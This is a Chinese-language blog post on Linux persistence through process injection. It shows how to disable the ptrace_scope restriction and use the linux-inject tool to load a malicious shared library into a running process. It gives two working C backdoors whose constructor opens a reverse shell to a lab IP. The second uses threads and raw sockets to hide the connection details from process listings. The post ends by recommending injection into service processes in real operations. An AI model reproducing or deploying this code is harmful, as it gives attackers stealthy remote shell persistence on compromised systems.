---
date: "2020-01-01T00:00:00Z"
description: 通过进程注入技术，能够使得动态链接库被加载到一个正在运行的进程，因此较为隐蔽。
title: Linux权限维持之进程注入
url: /archivers/2020-01-01/2
---

## 说明

通过进程注入技术，能够使得动态链接库被加载到一个正在运行的进程，因此较为隐蔽。进程注入通过调用`ptrace()`实现了与Windows平台下相同作用的API 函数`CreateRemoteThread()`。在许多Linux发行版中，内核的默认配置文件`/proc/sys/kernel/yama/ptrace_scope`限制了一个进程除了`fork()`派生外，无法通过`ptrace()`来操作另外一个进程。

要注入进程前，需要关闭这个限制（Root权限）：

```echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope```

![2020-01-03-13-10-44](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/28f181718173d69326f3bfc58a3c0cbb.png)

在Github上已经有了关于进程注入的实现代码：`https://github.com/gaffe23/linux-inject`

下载后进入项目目录，执行：make x86_64 即可编译64位的linux-inject。



![2020-01-03-13-10-54](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7b89dc61d7952191a608716bdcf951b8.png)


确认编译是否正常：

![2020-01-03-13-11-04](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/8251535f3c0f9b55243940b6de2cf34b.png)

获取sample-target的PID后，调用inject程序来注入sample-library.so，注入成功会输出“I just got loaded”。
接下来，需要更改sample-target.c文件，编译成需要的权限维持动态链接库。


```c
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdlib.h>


void shell()
{
	printf("I just got loaded\n");
    system("bash -c \"bash -i >& /dev/tcp/192.168.170.138/139 0>&1\"");
   
}


__attribute__((constructor))
void loadMsg()
{
   shell();
}

```

通过如下命令编译so文件：

```
clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o u9.so -lpthread -fPIC U3.c

```

![2020-01-03-13-11-16](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/ae110053d720c18b8c6bfb24a5483d4b.png)


编译成so文件成功后的测试效果：

![2020-01-03-13-11-27](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/d23ecdf9310a3dce4fd8839d9d10e270.png)

在Kali Linux这边获得了bash shell：

![2020-01-03-13-11-47](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/c2d15b84db450b39e55766b2097fd0c2.png)

此时发现测试程序的主线程被bash阻塞了，于是可以采用多线程技术，将后门代码与正常逻辑分离执行。

![2020-01-03-13-11-58](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/9e990f101b1f5bee215f4175926ac896.png)

但利用这种方式在执行的过程中，查看进程参数还是会被查看到IP地址和端口：

![2020-01-03-13-12-09](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b920dfc70a90769b21214fd5d217dbbc.png)

查看到IP与端口：

![2020-01-03-13-12-19](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/5f6901fde3fc0693424326f3deeede92.png)

再继续改进代码，采用socket套接字的方式来反弹shell：

```c
#include <stdio.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>


static void * hello()
{

    struct sockaddr_in server;
    int sock;
    char shell[]="/bin/bash";
    if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        return NULL;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(139);
    server.sin_addr.s_addr = inet_addr("192.168.170.138");
    if(connect(sock, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) {
        return NULL;
    }
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execl(shell,"/bin/bash",(char *)0);
    close(sock);
	printf("I just got loaded\n");
    return NULL;
}

__attribute__((constructor))
void loadMsg()
{
    pthread_t thread_id;
    pthread_create(&thread_id,NULL,hello,NULL);
}


```


执行效果：

![2020-01-03-13-12-35](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/fa4136ff8822c555b4008bce084f88a4.png)


Kali Linux获得bash shell：

![2020-01-03-13-12-46](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/003ee8252435ab25e2b012763fbf8d82.png)

在实战应用中，需要关闭ptrace的限制，然后注入.so到某个服务进程中，这样达到权限维持的目的。


